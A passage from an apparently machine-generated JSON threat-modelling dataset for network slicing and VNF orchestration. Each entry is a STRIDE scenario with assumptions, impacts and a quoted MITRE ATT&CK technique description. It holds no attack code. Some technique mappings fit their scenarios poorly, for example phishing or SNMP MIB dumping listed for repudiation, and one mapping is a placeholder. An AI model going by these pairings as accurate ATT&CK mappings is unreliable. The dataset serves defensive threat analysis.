            "mitre_technique": {
                "name": "Hide Artifacts",
                "description": "Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)",
                "id": "attack-pattern--22905430-4901-4c2a-84f6-98243cb173f8",
                "technique_id": "T1564"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies the orchestration policies to reallocate network resources improperly.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient network resource monitoring and auditing.",
                    "Role": "Network Admin",
                    "Condition": "Resource allocation is not regularly monitored or audited."
                },
                {
                    "Assumption": "Access to orchestration management tools is not adequately controlled.",
                    "Role": "Admin",
                    "Condition": "Access control policies are not strictly enforced."
                },
                {
                    "Assumption": "Policies can be altered without approval workflows.",
                    "Role": "Operational Manager",
                    "Condition": "Approval processes for policy changes are not implemented."
                }
            ],
            "Potential Impact": "Improper resource allocation, causing performance issues and potential data corruption.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "orchestration",
                "resource allocation",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker exploits an auditing weakness to perform unauthorized changes without being detected.",
            "Assumptions": [
                {
                    "Assumption": "Weak logging and monitoring systems in place.",
                    "Role": "Security Operator",
                    "Condition": "Logs are not detailed or regularly reviewed."
                },
                {
                    "Assumption": "Audit logs can be modified or deleted by unauthorized users.",
                    "Role": "System Admin",
                    "Condition": "Audit log protection measures are inadequate."
                },
                {
                    "Assumption": "Changes can be performed outside of operational hours without detection.",
                    "Role": "Attacker",
                    "Condition": "System operates without real-time monitoring."
                }
            ],
            "Potential Impact": "Avoidance of accountability for unauthorized actions, leading to data integrity and availability issues.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "auditing weaknesses",
                "unauthorized changes",
                "logging monitoring"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An insider admin performs unauthorized configuration changes and denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not covered by non-repudiation mechanisms.",
                    "Role": "System Admin",
                    "Condition": "Non-repudiation policies are not implemented."
                },
                {
                    "Assumption": "Insufficient monitoring and logging of admin activities.",
                    "Role": "Security Operator",
                    "Condition": "Admin actions are not closely monitored."
                },
                {
                    "Assumption": "Appropriate access controls are not enforced for configurations.",
                    "Role": "Access Control Manager",
                    "Condition": "Access controls on configuration systems are weak."
                }
            ],
            "Potential Impact": "Denial of responsibility for unauthorized actions, leading to potential security breaches and service interruptions.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "configuration changes",
                "repudiation",
                "denial of responsibility"
            ],
            "mitre_technique": {
                "name": "SNMP (MIB Dump)",
                "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP). The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--ee7ff928-801c-4f34-8a99-3df965e581a5",
                "technique_id": "T1602.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A compromised user account is used to perform transactions that the account owner denies.",
            "Assumptions": [
                {
                    "Assumption": "User session monitoring is inadequate.",
                    "Role": "Security Operator",
                    "Condition": "User sessions are not actively monitored."
                },
                {
                    "Assumption": "Authentication and session logs are not tamper-proof.",
                    "Role": "Log Manager",
                    "Condition": "Logs can be modified by unauthorized actors."
                },
                {
                    "Assumption": "User identity verification is weak.",
                    "Role": "Authentication Admin",
                    "Condition": "Strong identity verification methods are not implemented."
                }
            ],
            "Potential Impact": "Denial of legitimate transactions, leading to potential data disputes and integrity issues.",
            "MITRE ATT&CK Keywords": [
                "compromised account",
                "transactions",
                "repudiation",
                "session monitoring"
            ],
            "mitre_technique": {
                "name": "Phishing",
                "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nAdversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the human recipient as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software) or install adversary-accessible remote management tools onto their computer (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: Unit42 Luna Moth)",
                "id": "attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b",
                "technique_id": "T1566"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "A vulnerability in the external interface allows unauthorized access to sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "The external interface vulnerability is exploitable.",
                    "Role": "System Admin",
                    "Condition": "The vulnerability exists and is unpatched."
                },
                {
                    "Assumption": "Sensitive data is transmitted without adequate encryption.",
                    "Role": "Security Admin",
                    "Condition": "Data encryption measures are weak or absent."
                },
                {
                    "Assumption": "Access controls on sensitive data are insufficient.",
                    "Role": "Data Protection Officer",
                    "Condition": "Data access controls are not properly enforced."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive information, impacting data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "vulnerability",
                "external interface",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits misconfigurations in VNFs to access and exfiltrate data.",
            "Assumptions": [
                {
                    "Assumption": "VNF configurations are mismanaged or poorly documented.",
                    "Role": "System Admin",
                    "Condition": "Configuration management practices are weak."
                },
                {
                    "Assumption": "Data at rest is not encrypted.",
                    "Role": "Security Admin",
                    "Condition": "Encryption for stored data is not implemented."
                },
                {
                    "Assumption": "Unauthorized access to VNF operational data.",
                    "Role": "Network Admin",
                    "Condition": "Access control measures are improperly enforced."
                }
            ],
            "Potential Impact": "Sensitive data compromise leading to reputational damage and loss of confidentiality.",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "configuration",
                "VNF",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Data from Configuration Repository",
                "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.(Citation: US-CERT-TA18-106A)(Citation: US-CERT TA17-156A SNMP Abuse 2017)",
                "id": "attack-pattern--0ad7bc5c-235a-4048-944b-3b286676cb74",
                "technique_id": "T1602"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive user data is intercepted during transmission between network slices.",
            "Assumptions": [
                {
                    "Assumption": "Data transmission between slices is not encrypted.",
                    "Role": "Network Security Admin",
                    "Condition": "Encryption protocols are not enforced for slice communication."
                },
                {
                    "Assumption": "Network traffic can be intercepted.",
                    "Role": "Attacker",
                    "Condition": "No measures are taken to prevent traffic interception."
                },
                {
                    "Assumption": "Insufficient segmentation between network slices.",
                    "Role": "Network Admin",
                    "Condition": "Network slice segmentation is poorly implemented."
                }
            ],
            "Potential Impact": "Loss of confidential user data, leading to breaches in user privacy.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "data transmission",
                "network slices",
                "information disclosure"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker launches a DDoS attack targeting a specific network slice, disrupting its services.",
            "Assumptions": [
                {
                    "Assumption": "Network slice is exposed to the internet.",
                    "Role": "Network Admin",
                    "Condition": "Externally facing services are not sufficiently protected."
                },
                {
                    "Assumption": "Mitigation measures for DDoS attacks are not implemented.",
                    "Role": "Security Admin",
                    "Condition": "Anti-DDoS measures are weak or absent."
                },
                {
                    "Assumption": "Resource allocation for the network slice is limited.",
                    "Role": "System Operator",
                    "Condition": "Resource limits are not appropriately scaled."
                }
            ],
            "Potential Impact": "Service disruption, affecting availability and performance of targeted network slice.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "network slice",
                "denial of service",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malicious actor exploits a vulnerability in the VNF to crash the system, disrupting service.",
            "Assumptions": [
                {
                    "Assumption": "Exposed vulnerability in the VNF.",
                    "Role": "Security Analyst",
                    "Condition": "Vulnerability is known and exploitable."
                },
                {
                    "Assumption": "Improper patch management practices.",
                    "Role": "System Admin",
                    "Condition": "Patches are not applied promptly."
                },
                {
                    "Assumption": "Resources are not dynamically allocatable for recovery.",
                    "Role": "Network Operator",
                    "Condition": "Resource allocation mechanisms are limited."
                }
            ],
            "Potential Impact": "System crash, leading to loss of availability and potential performance degradation.",
            "MITRE ATT&CK Keywords": [
                "system crash",
                "VNF",
                "denial of service",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood the network orchestration system with requests, disrupting its ability to manage VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Orchestration system is accessible to attackers.",
                    "Role": "System Admin",
                    "Condition": "Access controls for orchestration interfaces are weak."
                },
                {
                    "Assumption": "Rate limiting is not implemented on orchestration requests.",
                    "Role": "Security Admin",
                    "Condition": "Requests are not rate-limited or controlled."
                },
                {
                    "Assumption": "Insufficient redundancy in orchestration nodes.",
                    "Role": "Network Operator",
                    "Condition": "Orchestration nodes are not geographically or logically redundant."
                }
            ],
            "Potential Impact": "Management capabilities are impaired, affecting VNF operations and network service availability.",
            "MITRE ATT&CK Keywords": [
                "flooding",
                "orchestration",
                "denial of service",
                "VNF management"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a vulnerability in the virtual environment to gain root access to VNFs.",
            "Assumptions": [
                {
                    "Assumption": "The hypervisor or container environment has known vulnerabilities.",
                    "Role": "Security Analyst",
                    "Condition": "Vulnerabilities are unpatched or ignored."
                },
                {
                    "Assumption": "The attacker has access to the virtual environment.",
                    "Role": "Network Admin",
                    "Condition": "Access controls are insufficient."
                },
                {
                    "Assumption": "Improper segregation of duties.",
                    "Role": "System Operator",
                    "Condition": "Admin roles are not properly segregated."
                }
            ],
            "Potential Impact": "Full control over the VNF, leading to potential data breaches, tampering, and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "vulnerability",
                "root access",
                "elevation of privilege",
                "VNF"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider leverages unused admin accounts with elevated privileges to perform unauthorized actions.",
            "Assumptions": [
                {
                    "Assumption": "Unused admin accounts remain active.",
                    "Role": "Account Manager",
                    "Condition": "Account management policies are poorly enforced."
                },
                {
                    "Assumption": "Admin accounts lack adequate monitoring.",
                    "Role": "Security Admin",
                    "Condition": "Admin activities are not logged or reviewed."
                },
                {
                    "Assumption": "Permissions are not regularly audited.",
                    "Role": "Access Control Manager",
                    "Condition": "Audit practices for permissions are weak."
                }
            ],
            "Potential Impact": "Unauthorized administrative actions leading to potential data tampering, denial of service, or data breaches.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "unused accounts",
                "elevated privileges",
                "unauthorized actions"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A malicious script exploits unvalidated inputs to gain elevated privileges within a network slice.",
            "Assumptions": [
                {
                    "Assumption": "Application does not validate or sanitize inputs adequately.",
                    "Role": "Developer",
                    "Condition": "Input validation and sanitization practices are weak."
                },
                {
                    "Assumption": "Insufficient runtime protection for scripts.",
                    "Role": "Security Analyst",
                    "Condition": "Runtime environments are not monitored for malicious activity."
                },
                {
                    "Assumption": "Error handling is improperly configured.",
                    "Role": "System Admin",
                    "Condition": "Errors reveal too much information or are not handled."
                }
            ],
            "Potential Impact": "Increased access levels within the network slice, enabling data breaches and service disruptions.",
            "MITRE ATT&CK Keywords": [
                "input validation",
                "malicious script",
                "elevated privileges",
                "network slice"
            ],
            "mitre_technique": {
                "name": "JavaScript",
                "description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
                "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
                "technique_id": "T1059.007"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "16",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers spoof a legitimate network slice to intercept or manipulate communications.",
            "Assumptions": [
                {
                    "Assumption": "Weak or no mutual authentication between network slices and devices.",
                    "Role": "Network administrator",
                    "Condition": "During initial setup or reconfiguration of network slices."
                },
                {
                    "Assumption": "Attackers have the capability to replicate network slice identifiers.",
                    "Role": "Cyber attacker",
                    "Condition": "With access to network protocols and configuration data."
                },
                {
                    "Assumption": "Lack of encryption or inadequate encryption standards.",
                    "Role": "System architect",
                    "Condition": "Due to performance optimization or outdated encryption protocols."
                }
            ],
            "Potential Impact": "Unauthorized access and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "communication interception",
                "identity disguise"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers impersonate legitimate control plane network functions to inject malicious commands.",
            "Assumptions": [
                {
                    "Assumption": "Control plane functions lack strong mutual authentication.",
                    "Role": "Network administrator",
                    "Condition": "During deployment or due to misconfiguration."
                },
                {
                    "Assumption": "Attackers have access to network function identifiers and protocols.",
                    "Role": "Cyber attacker",
                    "Condition": "Via network monitoring tools or stolen credentials."
                },
                {
                    "Assumption": "Insufficient audit logging and anomaly detection for control communications.",
                    "Role": "Security engineer",
                    "Condition": "Due to cost-saving measures or technical limitations."
                }
            ],
            "Potential Impact": "System disruption and extraction of sensitive data.",
            "MITRE ATT&CK Keywords": [
                "impersonation",
                "control plane",
                "command injection",
                "network manipulation"
            ],
            "mitre_technique": {
                "name": "Trust Modification",
                "description": "Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.\n\nManipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain) \n\nAn adversary may also add a new federated identity provider to an identity tenant such as Okta, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023)",
                "id": "attack-pattern--24769ab5-14bd-4f4e-a752-cfb185da53ee",
                "technique_id": "T1484.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Compromised external interface mimics a valid service provider connection.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not enforce strict identity verification.",
                    "Role": "Network administrator",
                    "Condition": "During setup or due to outdated policies."
                },
                {
                    "Assumption": "Attackers have detailed knowledge of legitimate interface configurations.",
                    "Role": "Cyber attacker",
                    "Condition": "Through reconnaissance or insider information."
                },
                {
                    "Assumption": "Connections are not encrypted or use weak encryption standards.",
                    "Role": "System architect",
                    "Condition": "Due to performance considerations or legacy systems."
                }
            ],
            "Potential Impact": "Unauthorized service access and data interception.",
            "MITRE ATT&CK Keywords": [
                "mimic",
                "external interface",
                "service provider",
